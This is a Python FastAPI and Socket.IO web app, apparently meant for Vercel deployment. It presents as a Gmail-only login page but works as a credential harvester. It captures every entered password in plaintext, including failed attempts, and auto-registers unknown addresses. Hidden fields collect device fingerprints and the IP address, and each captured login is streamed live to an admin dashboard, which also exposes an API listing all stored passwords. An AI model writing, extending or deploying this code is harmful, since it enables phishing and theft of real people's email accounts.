import uvicorn
from fastapi import FastAPI, Request, Form, Response, Depends, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import socketio
import datetime
import os  # <-- Make sure 'os' is imported

# ---------- In-memory prototype stores (NOT for production) ----------
users = {}  # username -> password (plaintext here for prototype only)
login_events = []  # list of dicts {username, password, ip, ts, ...}

# Admin secret for accessing admin pages (set to something secure locally)
ADMIN_SECRET = os.environ.get("ADMIN_SECRET", "adminpass")  # change for local use

# ---------- Socket.IO server (async) ----------
sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')
app = FastAPI()
sio_app = socketio.ASGIApp(sio, other_asgi_app=app)


# ====================================================================
# ---------- START: VERCEL DEPLOYMENT FIX ----------

# Get the absolute path of the directory this file is in
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Define the absolute path for the 'static' directory
STATIC_DIR = os.path.join(BASE_DIR, "static")

# Define the absolute path for the 'templates' directory
TEMPLATE_DIR = os.path.join(BASE_DIR, "templates")

# Create the static directory if it doesn't exist (good practice)
if not os.path.exists(STATIC_DIR):
    os.makedirs(STATIC_DIR)

# Mount static files using the ABSOLUTE path
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

# Load templates using the ABSOLUTE path
templates = Jinja2Templates(directory=TEMPLATE_DIR)

# ---------- END: VERCEL DEPLOYMENT FIX ----------
# ====================================================================


# ---------- Helpers ----------
def record_login(
    request: Request,
    username: str,
    password: str,
    client_os: str,
    client_browser: str,
    client_resolution: str,
    client_timezone: str,
    client_language: str,
    client_cpu_cores: str,
    client_user_agent: str
):
    ip = request.client.host if request.client else "unknown"
    ts = datetime.datetime.utcnow().isoformat() + "Z"
    
    event = {
        "username": username,
        "password": password,
        "ip": ip,
        "ts": ts,
        "os": client_os,
        "browser": client_browser,
        "resolution": client_resolution,
        "timezone": client_timezone,
        "language": client_language,
        "cpu_cores": client_cpu_cores,
        "user_agent": client_user_agent
    }
    
    login_events.append(event)
    
    # Emit to connected admin dashboards
    try:
        import asyncio
        asyncio.create_task(sio.emit("login_event", event))
    except Exception as e:
        print(f"SocketIO emit error: {e}")
        
    return event

def check_admin_token(request: Request):
    token = request.cookies.get("admin_token")
    if token != ADMIN_SECRET:
        # Redirect to login if not authenticated
        raise HTTPException(
            status_code=307,
            detail="Admin auth required",
            headers={"Location": "/admin/login"}
        )
    return True

# ---------- Routes: Public ----------
@app.get("/", response_class=HTMLResponse)
def home(request: Request):
    return RedirectResponse(url="/login")

@app.get("/signup", response_class=HTMLResponse)
def signup_get(request: Request):
    return templates.TemplateResponse("signup.html", {"request": request})

@app.post("/signup")
async def signup_post(request: Request, username: str = Form(...), password: str = Form(...)):
    if not username.endswith("@gmail.com"):
        return templates.TemplateResponse(
            "signup.html",
            {"request": request, "error": "Email must end with @gmail.com"}
        )
    if username in users:
        return templates.TemplateResponse(
            "signup.html",
            {"request": request, "error": "This Gmail address is already registered."}
        )
    users[username] = password
    return templates.TemplateResponse(
        "signup.html",
        {"request": request, "success": "Account created successfully. Please log in."}
    )


@app.get("/login", response_class=HTMLResponse)
def login_get(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
async def login_post(
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    # NEW: Receive client info from hidden fields
    client_os: str = Form("N/A"),
    client_browser: str = Form("N/A"),
    client_resolution: str = Form("N/A"),
    client_timezone: str = Form("N/A"),
    client_language: str = Form("N/A"),
    client_cpu_cores: str = Form("N/A"),
    client_user_agent: str = Form("N/A")
):
    if not username.endswith("@gmail.com"):
        return templates.TemplateResponse(
            "login.html",
            {"request": request, "error": "Email must end with @gmail.com", "form": {"username": username}}
        )

    # Function to pass all data to the logger
    def log_the_login():
        record_login(
            request, username, password,
            client_os, client_browser, client_resolution,
            client_timezone, client_language, client_cpu_cores, client_user_agent
        )

    pw = users.get(username)
    if pw is None:
        # Auto-register
        users[username] = password
        log_the_login()
        resp = RedirectResponse(url="/", status_code=302)
        resp.set_cookie("user", username, httponly=True)
        return resp

    if pw != password:
        # Note: We still log the *attempted* password
        log_the_login()
        return templates.TemplateResponse(
            "login.html",
            {"request": request, "error": "Invalid password.", "form": {"username": username}}
        )

    # Record successful login
    log_the_login()
    resp = RedirectResponse(url="/", status_code=302)
    resp.set_cookie("user", username, httponly=True)
    return resp

# ---------- Admin routes ----------
@app.get("/admin/login", response_class=HTMLResponse)
def admin_login_get(request: Request):
    return templates.TemplateResponse("admin_login.html", {"request": request})

@app.post("/admin/login")
def admin_login_post(request: Request, password: str = Form(...)):
    if password != ADMIN_SECRET:
        return templates.TemplateResponse("admin_login.html", {"request": request, "error": "Wrong admin password."})
    
    resp = RedirectResponse(url="/admin/dashboard", status_code=302)
    resp.set_cookie("admin_token", ADMIN_SECRET, httponly=True)
    return resp

@app.get("/api/get_users", dependencies=[Depends(check_admin_token)])
def api_get_users():
    return users

@app.get("/admin/dashboard", response_class=HTMLResponse, dependencies=[Depends(check_admin_token)])
def admin_dashboard(request: Request):
    return templates.TemplateResponse("admin_dashboard.html", {
        "request": request,
        "users": users,
        "events": reversed(login_events)
    })

# ---------- Socket.IO events ----------
@sio.event
async def connect(sid, environ):
    print("Socket connected:", sid)

@sio.event
async def disconnect(sid):
    print("Socket disconnected:", sid)

# ---------- Run via: uvicorn main:sio_app --reload --port 8000 ----------
if __name__ == "__main__":
    uvicorn.run("main:sio_app", host="127.0.0.1", port=8000, reload=True)
